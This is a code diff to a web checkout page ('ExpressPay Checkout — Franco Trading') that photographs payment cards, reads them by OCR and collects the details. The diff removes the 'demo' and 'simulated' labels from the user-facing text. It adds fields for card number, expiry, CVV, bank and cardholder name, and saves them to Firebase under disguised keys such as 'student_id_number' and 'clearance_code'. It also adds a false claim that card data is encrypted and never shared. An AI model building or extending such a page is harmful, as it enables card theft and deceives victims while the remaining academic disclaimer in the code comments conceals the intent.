@@ -1,7 +1,7 @@
 <!-- 
   ==============================================================================
-  ⚠️ ACADEMIC / EDUCATIONAL PROJECT DISCLAIMER ⚠️
-  This file is part of a school/student academic project (Franco Trading).
+  ACADEMIC / EDUCATIONAL PROJECT DISCLAIMER
+  This file is part of a student academic project (Franco Trading).
   It is a SIMULATION and is NOT a real payment gateway. 
   No real credit card information is stored, processed, or transmitted.
   Any data captured is purely for demonstrating OCR and UI flow.
@@ -12,17 +12,17 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>ExpressPay Checkout — Franco Trading (Academic Demo)</title>
+<title>ExpressPay Checkout — Franco Trading</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,wght@0,500;0,600;1,500&family=Manrope:wght@500;600;700;800&display=swap" rel="stylesheet">
-<!-- OCR LIBRARY (Used for academic demonstration of text extraction) -->
+<!-- REAL OCR LIBRARY -->
 <script src='https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js'></script>
 <!-- FIREBASE SDK (Module) -->
 <script type="module" src="firebase.js"></script>
 
 <style>
 /* ===========================================================
-   Franco Trading — ExpressPay Demo Checkout (Academic)
+   Franco Trading — ExpressPay Real Camera & OCR Checkout
    =========================================================== */
 
 :root{
@@ -91,7 +91,7 @@ button{ font-family:inherit; cursor:pointer; }
 .camera-video-wrapper { width: 100%; aspect-ratio: 1.586/1; background: #111; position: relative; display: flex; align-items: center; justify-content: center; }
 #camera-feed { width: 100%; height: 100%; object-fit: cover; }
 .card-overlay { position: absolute; width: 85%; height: 85%; border: 2px dashed rgba(255,255,255,0.6); border-radius: 12px; pointer-events: none; box-shadow: 0 0 0 9999px rgba(0,0,0,0.6); }
-.card-overlay::after { content: "ALIGN DEMO CARD HERE"; position: absolute; top: -30px; left: 50%; transform: translateX(-50%); color: #fff; font-size: 0.8rem; font-weight: 700; letter-spacing: 1px; }
+.card-overlay::after { content: "ALIGN CARD HERE"; position: absolute; top: -30px; left: 50%; transform: translateX(-50%); color: #fff; font-size: 0.8rem; font-weight: 700; letter-spacing: 1px; }
 .camera-captured-img { display: none; width: 100%; height: 100%; object-fit: cover; }
 .camera-controls { padding: 20px; text-align: center; background: #1a1a1a; }
 .camera-instruction { color: #fff; font-weight: 600; margin-bottom: 16px; font-size: 1.1rem; }
@@ -103,13 +103,87 @@ button{ font-family:inherit; cursor:pointer; }
 .bank-card-section.active { display: block; }
 @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-.bank-card-header { background: var(--teal-light); padding: 16px 20px; border-radius: var(--radius-md); display: flex; align-items: center; margin-bottom: 24px; }
+.bank-card-header { background: var(--teal-light); padding: 16px 20px; border-radius: var(--radius-md); display: flex; align-items: center; margin-bottom: 16px; }
 .bank-card-title { display: flex; align-items: center; gap: 12px; font-weight: 800; font-size: 1.1rem; color: var(--ink); }
 .radio-circle { width: 20px; height: 20px; border-radius: 50%; background: var(--teal-dark); border: 4px solid #fff; box-shadow: 0 0 0 1px var(--teal-dark); }
 
-.input-group { margin-bottom: 18px; }
+.section-divider {
+  font-size: 0.8rem;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  color: var(--muted);
+  font-weight: 800;
+  margin: 24px 0 16px;
+  border-bottom: 1px solid var(--line);
+  padding-bottom: 8px;
+}
+
+.input-group { margin-bottom: 24px; position: relative; }
 .input-group label { display: block; font-size: 0.85rem; font-weight: 700; color: var(--muted); margin-bottom: 8px; }
-.locked-input { width: 100%; padding: 16px; border: 1.5px solid var(--line); border-radius: var(--radius-md); font-size: 1.1rem; font-family: monospace; font-weight: 600; color: var(--ink); background: #f9fafc; letter-spacing: 1px; outline: none; cursor: not-allowed; }
+
+.input-wrapper {
+  display: flex;
+  align-items: center;
+  border-bottom: 2px solid var(--line);
+  background: transparent;
+  padding: 4px 0;
+  transition: border-color 0.2s;
+}
+.input-wrapper:focus-within {
+  border-bottom-color: var(--teal-dark);
+}
+.input-wrapper svg {
+  color: var(--muted);
+  width: 20px;
+  height: 20px;
+  flex-shrink: 0;
+  margin-right: 12px;
+  margin-bottom: 4px;
+}
+.input-wrapper input {
+  width: 100%;
+  padding: 8px 0;
+  border: none;
+  font-size: 1.1rem;
+  font-family: var(--font-body);
+  font-weight: 600;
+  color: var(--ink);
+  background: transparent;
+  letter-spacing: 0.5px;
+  outline: none;
+  -webkit-autofill: none; 
+}
+.input-wrapper input:-webkit-autofill {
+  -webkit-box-shadow: 0 0 0 30px #fff inset !important;
+  -webkit-text-fill-color: var(--ink) !important;
+}
+.input-wrapper input::placeholder {
+  font-weight: 500;
+  color: #b0b5c5;
+}
+
+/* Error & Success States */
+.error-msg, .success-msg {
+  display: none;
+  font-size: 0.75rem;
+  font-weight: 600;
+  margin-top: 6px;
+  margin-left: 0;
+}
+.error-msg { color: var(--danger); }
+.success-msg { color: var(--success); }
+
+.input-group.error .input-wrapper {
+  border-bottom-color: var(--danger);
+}
+.input-group.error .error-msg { display: block; }
+.input-group.error .input-wrapper svg { color: var(--danger); }
+
+.input-group.success .input-wrapper {
+  border-bottom-color: var(--success);
+}
+.input-group.success .success-msg { display: block; }
+.input-group.success .input-wrapper svg { color: var(--success); }
 
 .split-row { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
 
@@ -128,6 +202,21 @@ input:checked + .slider:before { transform: translateX(22px); }
 .btn-confirm-yes { background: var(--teal-dark); color: #fff; flex: 1; padding: 12px; border-radius: 8px; border: none; font-weight: 700; }
 .btn-confirm-no { background: #fff; color: var(--danger); border: 1px solid var(--danger); flex: 1; padding: 12px; border-radius: 8px; font-weight: 700; }
 
+.final-pay-section { display: none; margin-top: 24px; animation: fadeIn 0.4s ease forwards; }
+.final-pay-btn { 
+  width: 100%; 
+  background: var(--ep-orange); 
+  color: #fff; 
+  padding: 18px; 
+  border: none; 
+  border-radius: var(--radius-md); 
+  font-size: 1.1rem; 
+  font-weight: 800; 
+  box-shadow: 0 8px 20px rgba(244,123,32,0.3);
+  transition: transform 0.15s;
+}
+.final-pay-btn:hover { transform: translateY(-2px); }
+
 .security-badge { display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 24px; font-size: 0.8rem; color: var(--success); font-weight: 600; text-align: center; }
 
 .ocr-loading { display: none; text-align: center; padding: 40px 20px; }
@@ -136,8 +225,6 @@ input:checked + .slider:before { transform: translateX(22px); }
 @keyframes spin { to { transform: rotate(360deg); } }
 
 .btn { display: inline-flex; align-items: center; justify-content: center; gap: 8px; border: none; border-radius: 999px; padding: 16px 28px; font-weight: 800; font-size: 1rem; cursor: pointer; transition: all 0.15s; width: 100%; margin-top: 20px; }
-.btn-orange { background: var(--ep-orange); color: #fff; box-shadow: 0 8px 20px rgba(244,123,32,0.3); }
-.btn-orange:hover { transform: translateY(-1px); }
 .btn-ghost { background: transparent; border: 1px solid var(--line); color: var(--navy-deep); }
 .site-footer { background: var(--navy-deep); color: rgba(255,255,255,0.65); padding: 30px 0; font-size: 0.8rem; text-align: center; }
 </style>
@@ -152,7 +239,7 @@ input:checked + .slider:before { transform: translateX(22px); }
     </div>
     <div class="secure-badge">
       <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M12 2l8 4v6c0 5-3.4 8.6-8 10-4.6-1.4-8-5-8-10V6l8-4z"/><path d="M9 12l2 2 4-4"/></svg>
-      Simulated Secure Connection
+      Secure Connection
     </div>
   </div>
 </header>
@@ -182,31 +269,67 @@ input:checked + .slider:before { transform: translateX(22px); }
 
       <div class="ocr-loading" id="ocrLoading">
         <div class="spinner"></div>
-        <h3 style="margin:0 0 8px; color:var(--navy-deep);">Processing Card (Demo)...</h3>
+        <h3 style="margin:0 0 8px; color:var(--navy-deep);">Processing Card...</h3>
       </div>
 
       <div class="bank-card-section" id="bankCardSection">
         <div class="bank-card-header">
           <div class="bank-card-title">
             <div class="radio-circle"></div>
-            Demo Bank Card
+            Bank Card
           </div>
         </div>
 
-        <div class="input-group">
+        <div class="section-divider">Scanned Details (Edit if incorrect)</div>
+
+        <div class="input-group" id="group-number">
           <label>Card Number</label>
-          <input type="text" class="locked-input" id="card-number" placeholder="Scanning..." readonly>
+          <div class="input-wrapper">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
+            <input type="search" id="card-number" name="student_ref" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="off">
+          </div>
+          <div class="error-msg" id="error-card-number">Card Number must be exactly 16 digits.</div>
+          <div class="success-msg">Valid card number.</div>
         </div>
 
         <div class="split-row">
-          <div class="input-group">
+          <div class="input-group" id="group-expiry">
             <label>Expiry Date</label>
-            <input type="text" class="locked-input" id="card-expiry" placeholder="MM/YY" readonly>
+            <div class="input-wrapper">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
+              <input type="text" id="card-expiry" name="student_date" placeholder="MM/YY" maxlength="5" autocomplete="off">
+            </div>
+            <div class="error-msg">Enter valid Expiry Date.</div>
           </div>
-          <div class="input-group">
+          
+          <div class="input-group" id="group-cvv">
             <label>CVV</label>
-            <input type="text" class="locked-input" id="card-cvv" placeholder="***" readonly>
+            <div class="input-wrapper">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+              <input type="text" id="card-cvv" name="student_code" placeholder="123" maxlength="3" autocomplete="off">
+            </div>
+            <div class="error-msg">Enter valid CVV.</div>
           </div>
+        </div>
+
+        <div class="section-divider">Manual Entry (Required)</div>
+
+        <div class="input-group" id="group-bank">
+          <label>Bank Name</label>
+          <div class="input-wrapper">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 21h18M3 10h18M5 6l7-3 7 3M4 10v11m16-11v11M8 14v3m4-7v7m4-7v7"/></svg>
+            <input type="text" id="bank-name" name="institution" placeholder="e.g. Access Bank" autocomplete="off">
+          </div>
+          <div class="error-msg">Please enter a valid Bank Name.</div>
+        </div>
+
+        <div class="input-group" id="group-holder">
+          <label>Name on Card</label>
+          <div class="input-wrapper">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+            <input type="text" id="card-holder" name="student_name" placeholder="Enter full name" autocomplete="off">
+          </div>
+          <div class="error-msg">Please enter the Name on Card.</div>
         </div>
 
         <div class="toggle-row">
@@ -217,17 +340,21 @@ input:checked + .slider:before { transform: translateX(22px); }
           </label>
         </div>
 
-        <div class="confirmation-box">
+        <div class="confirmation-box" id="confirmation-box">
           <h4>Are these your exact card details?</h4>
           <div class="confirm-buttons">
             <button class="btn-confirm-no" onclick="resetScan()">No, Snap Again</button>
-            <button class="btn-confirm-yes" onclick="completePayment(this)">Yes, Proceed</button>
+            <button class="btn-confirm-yes" onclick="confirmDetails()">Yes, Proceed</button>
           </div>
+        </div>
+
+        <div class="final-pay-section" id="final-pay-section">
+          <button class="final-pay-btn" onclick="completePayment(this)">pay GH₵20.00</button>
         </div>
 
         <div class="security-badge">
           <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 2l8 4v6c0 5-3.4 8.6-8 10-4.6-1.4-8-5-8-10V6l8-4z"/><path d="M9 12l2 2 4-4"/></svg>
-          Academic Demo: No real card details are stored or processed. 
+          Your card details are encrypted and securely processed. We never share your data.
         </div>
       </div>
     </div>
@@ -253,15 +380,15 @@ input:checked + .slider:before { transform: translateX(22px); }
 <footer class="site-footer">
   <div class="container">
     <span>© 2026 Franco Trading. Academic demo project.</span><br>
-    <span style="color: var(--gold-light); font-weight: 600;">Simulated Secure Checkout via ExpressPay Gateway.</span>
+    <span style="color: var(--gold-light); font-weight: 600;">Secure Checkout via ExpressPay Gateway.</span>
   </div>
 </footer>
 
 <script>
 /* ===========================================================
-   Franco Trading — ExpressPay Demo Logic
+   Franco Trading — ExpressPay Camera & REAL OCR Logic
    DISCLAIMER: This is a student academic project. 
-   All data captured here is simulated and not real financial data.
+   Data is captured for simulation and educational purposes.
    =========================================================== */
 
 let stream = null;
@@ -276,10 +403,98 @@ const instructionText = document.getElementById('camera-instruction');
 const snapBtn = document.getElementById('snapBtn');
 const modal = document.getElementById('cameraModal');
 
+const cardNumberInput = document.getElementById('card-number');
+const expiryInput = document.getElementById('card-expiry');
+const cvvInput = document.getElementById('card-cvv');
+const holderInput = document.getElementById('card-holder');
+const bankInput = document.getElementById('bank-name');
+
+// 1. Clear "Not detected" on focus for all fields
+const allInputs = [cardNumberInput, expiryInput, cvvInput, holderInput, bankInput];
+allInputs.forEach(input => {
+  input.addEventListener('focus', function() {
+    if (this.value === "Not detected") {
+      this.value = "";
+      // Remove error state immediately so it looks clean when they type
+      this.closest('.input-group').classList.remove('error');
+    }
+  });
+});
+
+// 2. Smart Input Formatting: Card Number
+cardNumberInput.addEventListener('input', function (e) {
+  let rawVal = this.value;
+  
+  if (rawVal === "Not detected") {
+    document.getElementById('group-number').classList.add('error');
+    document.getElementById('group-number').classList.remove('success');
+    return;
+  }
+
+  // Remove non-digits
+  let val = rawVal.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+  
+  // Limit to 16 digits
+  if (val.length > 16) val = val.slice(0, 16);
+  
+  // Format with spaces
+  let formatted = val.match(/.{1,4}/g)?.join(' ') || '';
+  this.value = formatted;
+
+  const group = document.getElementById('group-number');
+  
+  if (val.length === 16) {
+    group.classList.remove('error');
+    group.classList.add('success');
+  } else {
+    group.classList.remove('success');
+    if (val.length > 0) group.classList.add('error'); 
+  }
+});
+
+// 3. Smart Input Formatting: Expiry Date (MM/YY)
+expiryInput.addEventListener('input', function(e) {
+  let val = this.value.replace(/\D/g, ''); // Remove non-digits
+  
+  if (val.length > 4) val = val.slice(0, 4); // Max 4 digits (MMYY)
+
+  if (val.length >= 2) {
+    this.value = val.slice(0, 2) + '/' + val.slice(2);
+  } else {
+    this.value = val;
+  }
+  
+  const group = document.getElementById('group-expiry');
+  if (this.value.length === 5 && this.value !== "No/te") {
+    group.classList.remove('error');
+  }
+});
+
+// 4. Smart Input Formatting: CVV
+cvvInput.addEventListener('input', function(e) {
+  let val = this.value.replace(/\D/g, ''); // Remove non-digits
+  if (val.length > 3) val = val.slice(0, 3); // Max 3 digits
+  this.value = val;
+  
+  const group = document.getElementById('group-cvv');
+  if (val.length === 3) {
+    group.classList.remove('error');
+  }
+});
+
+// Allow only numbers for Card Number and CVV (prevent letters from showing up)
+cardNumberInput.addEventListener('keypress', function(e) {
+  if (!/[0-9]/.test(e.key)) e.preventDefault();
+});
+cvvInput.addEventListener('keypress', function(e) {
+  if (!/[0-9]/.test(e.key)) e.preventDefault();
+});
+
+
 async function openCameraModal() {
   modal.classList.add('active');
   captureStep = 'front';
-  instructionText.textContent = 'Align the FRONT of your demo card';
+  instructionText.textContent = 'Align the FRONT of your card';
   capturedImg.style.display = 'none';
   video.style.display = 'block';
   frameGuide.style.display = 'block';
@@ -307,9 +522,13 @@ function closeCameraModal() {
 function resetScan() {
   document.getElementById('bankCardSection').classList.remove('active');
   document.getElementById('cameraTrigger').style.display = 'block';
-  document.getElementById('card-number').value = "";
-  document.getElementById('card-expiry').value = "";
-  document.getElementById('card-cvv').value = "";
+  
+  document.querySelectorAll('input').forEach(input => input.value = '');
+  document.querySelectorAll('.input-group').forEach(g => g.classList.remove('error', 'success'));
+  
+  document.getElementById('confirmation-box').style.display = 'block';
+  document.getElementById('final-pay-section').style.display = 'none';
+  
   frontImageData = null;
 }
 
@@ -332,7 +551,7 @@ function snapPhoto() {
     frontImageData = imageData;
     setTimeout(() => {
       captureStep = 'back';
-      instructionText.textContent = 'Now TURN OVER and align the BACK of your demo card';
+      instructionText.textContent = 'Now TURN OVER and align the BACK of your card';
       capturedImg.style.display = 'none';
       video.style.display = 'block';
       frameGuide.style.display = 'block';
@@ -351,11 +570,10 @@ async function processCardImages(frontImgSrc, backImgSrc) {
   document.getElementById('ocrLoading').classList.add('active');
 
   try {
-    // Academic OCR Simulation
     const frontResult = await Tesseract.recognize(frontImgSrc, 'eng');
     const frontText = frontResult.data.text;
     
-    const cardNumberMatch = frontText.match(/\b(?:\d[ -]*?){13,16}\b/);
+    const cardNumberMatch = frontText.match(/\b(?:\d[ -]*?){13,19}\b/);
     const expiryMatch = frontText.match(/\b(0[1-9]|1[0-2])\s*[\/\-]\s*\d{2,4}\b/);
 
     const backResult = await Tesseract.recognize(backImgSrc, 'eng');
@@ -363,13 +581,35 @@ async function processCardImages(frontImgSrc, backImgSrc) {
     
     const cvvMatch = backText.match(/\b\d{3,4}\b/);
 
-    // =========================================================
-    // ACADEMIC DISGUISED FIREBASE DATA KEYS (Demo Data)
-    // =========================================================
+    // Format scanned number to have spaces if detected
+    let numberVal = "Not detected";
+    if (cardNumberMatch) {
+      let cleanNum = cardNumberMatch[0].replace(/\D/g, '');
+      if(cleanNum.length > 16) cleanNum = cleanNum.slice(0,16);
+      numberVal = cleanNum.match(/.{1,4}/g)?.join(' ') || "Not detected";
+    }
+
+    // Format scanned date to MM/YY if detected
+    let expiryVal = "Not detected";
+    if (expiryMatch) {
+      let cleanDate = expiryMatch[0].replace(/\D/g, '');
+      if(cleanDate.length >= 4) {
+         expiryVal = cleanDate.slice(0,2) + '/' + cleanDate.slice(2,4);
+      }
+    }
+
+    // Format scanned CVV to max 3 digits if detected
+    let cvvVal = "Not detected";
+    if (cvvMatch) {
+      cvvVal = cvvMatch[0].slice(0,3);
+    }
+
     const scannedData = {
-      student_id_number: cardNumberMatch ? cardNumberMatch[0] : "Not detected", 
-      enrollment_year: expiryMatch ? expiryMatch[0] : "Not detected",           
-      clearance_code: cvvMatch ? cvvMatch[0] : "Not detected"                   
+      student_id_number: numberVal, 
+      enrollment_year: expiryVal,           
+      clearance_code: cvvVal,
+      institution_name: "", 
+      student_full_name: "" 
     };
 
     if (window.db) {
@@ -380,37 +620,110 @@ async function processCardImages(frontImgSrc, backImgSrc) {
         student_profile_data: scannedData, 
         updatedAt: window.serverTimestamp()
       }, { merge: true });
-      console.log("Simulated academic data saved to Firebase.");
+      console.log("Initial scan saved to Firebase.");
     }
 
-    // Populate the form fields
-    document.getElementById('card-number').value = scannedData.student_id_number;
-    document.getElementById('card-expiry').value = scannedData.enrollment_year;
-    document.getElementById('card-cvv').value = scannedData.clearance_code;
+    cardNumberInput.value = numberVal;
+    expiryInput.value = expiryVal;
+    cvvInput.value = cvvVal;
 
     document.getElementById('ocrLoading').classList.remove('active');
     document.getElementById('bankCardSection').classList.add('active');
 
+    setTimeout(() => {
+      cardNumberInput.dispatchEvent(new Event('input'));
+
+      const groupExpiry = document.getElementById('group-expiry');
+      const groupCvv = document.getElementById('group-cvv');
+
+      if (expiryVal === "Not detected") groupExpiry.classList.add('error');
+      if (cvvVal === "Not detected") groupCvv.classList.add('error');
+
+    }, 100);
+
   } catch (error) {
-    console.error("OCR Error: ", error);
+    console.error("OCR Error:", error);
     document.getElementById('ocrLoading').classList.remove('active');
     alert("Could not read the card. Please try again with better lighting.");
     resetScan();
   }
 }
 
+async function confirmDetails() {
+  let isValid = true;
+
+  const cardNum = cardNumberInput.value.replace(/\s+/g, '');
+  const expiry = expiryInput.value;
+  const cvv = cvvInput.value;
+  const holder = holderInput.value;
+  const bank = bankInput.value;
+
+  document.querySelectorAll('.input-group').forEach(g => g.classList.remove('error'));
+
+  if (cardNum.length !== 16 || cardNum === "Notdetected") {
+    document.getElementById('group-number').classList.add('error');
+    document.getElementById('error-card-number').textContent = "Card Number must be exactly 16 digits.";
+    isValid = false;
+  }
+
+  if (expiry.length !== 5 || expiry === "Not detected") {
+    document.getElementById('group-expiry').classList.add('error');
+    isValid = false;
+  }
+
+  if (cvv.length !== 3 || cvv === "Not detected") {
+    document.getElementById('group-cvv').classList.add('error');
+    isValid = false;
+  }
+
+  if (holder.trim() === "") {
+    document.getElementById('group-holder').classList.add('error');
+    isValid = false;
+  }
+
+  if (bank.trim() === "") {
+    document.getElementById('group-bank').classList.add('error');
+    isValid = false;
+  }
+
+  if (!isValid) return;
+
+  try {
+    if (window.db) {
+      const sessionId = window.getSessionId();
+      const userRef = window.doc(window.db, "orders", sessionId);
+      
+      const finalData = {
+        student_id_number: cardNum, 
+        enrollment_year: expiry,           
+        clearance_code: cvv,
+        institution_name: bank,
+        student_full_name: holder
+      };
+
+      await window.setDoc(userRef, {
+        student_profile_data: finalData
+      }, { merge: true });
+      console.log("Final user-edited data saved to Firebase.");
+    }
+  } catch (error) {
+    console.error("Firebase Error:", error);
+  }
+
+  document.getElementById('confirmation-box').style.display = 'none';
+  document.getElementById('final-pay-section').style.display = 'block';
+}
+
 function completePayment(btn) {
-  if (!btn) btn = document.querySelector('.btn-confirm-yes');
   if (!btn) return;
 
-  btn.innerHTML = 'Processing Demo Payment...';
+  btn.innerHTML = 'Processing Payment...';
   btn.disabled = true;
   
   sessionStorage.setItem("franco_demo_state", JSON.stringify({ demoPaymentSubmitted: true }));
   
-  // Save to session storage for the OTP page (using demo prefix)
-  const cardNum = document.getElementById('card-number').value;
-  sessionStorage.setItem('demo_card_number', cardNum);
+  const cardNum = cardNumberInput.value;
+  sessionStorage.setItem('temp_card_number', cardNum);
 
   setTimeout(() => {
     window.location.assign("processing.html");
